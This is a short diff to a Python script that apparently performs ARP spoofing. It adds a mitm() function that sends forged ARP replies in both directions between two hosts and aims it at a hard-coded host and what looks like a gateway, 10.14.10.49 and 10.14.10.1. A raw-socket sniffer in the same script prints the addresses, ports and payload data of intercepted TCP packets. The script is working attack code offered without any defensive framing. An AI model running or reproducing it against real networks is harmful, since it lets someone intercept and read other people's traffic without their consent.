@@ -51,6 +51,10 @@ def arp_reply(target_ip, sender_ip, sender_mac = 0):
 	s.send(b''.join(arp_packet))
 	s.close()
 
+def mitm(host1, host2):
+	arp_reply(host1, host2)
+	arp_reply(host2, host1)
+
 def listen_to_incoming_packets(Host_One_IP, Host_Two_IP):
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 
@@ -104,4 +108,4 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP):
             print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
 
 thread.start_new_thread(listen_to_incoming_packets, ('127.0.0.1', '127.0.0.1'))
-arp_reply('10.14.10.49', '10.14.10.1')
+mitm('10.14.10.49', '10.14.10.1')
